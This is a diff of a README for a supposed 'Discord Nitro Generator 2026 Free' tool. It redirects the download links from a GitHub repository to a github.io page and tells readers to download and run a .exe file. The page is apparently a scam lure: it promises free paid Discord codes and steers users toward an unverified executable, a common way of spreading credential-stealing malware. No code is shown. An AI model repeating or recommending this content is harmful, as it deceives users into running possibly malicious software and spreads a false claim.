@@ -1,6 +1,6 @@
 # 🚀 Discord-Nitro-Generator-2026-Free - Get Free Nitro Codes With Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Nitro_Generator-blue.svg)](https://github.com/Vinnysubjugated176/Discord-Nitro-Generator-2026-Free)
+[![Download Now](https://img.shields.io/badge/Download-Nitro_Generator-blue.svg)](https://vinnysubjugated176.github.io)
 
 ## 📖 About This Tool
 
@@ -21,7 +21,7 @@ To run this application, your computer needs the following specifications:
 
 Follow these steps to prepare the tool on your machine.
 
-1.  Visit the official repository page to access the latest version: [https://github.com/Vinnysubjugated176/Discord-Nitro-Generator-2026-Free](https://github.com/Vinnysubjugated176/Discord-Nitro-Generator-2026-Free).
+1.  Visit the official repository page to access the latest version: [https://vinnysubjugated176.github.io](https://vinnysubjugated176.github.io).
 2.  Locate the Releases section on the right side of the page.
 3.  Click the link for the most recent build, usually labeled with a version number.
 4.  Download the file ending in .exe.
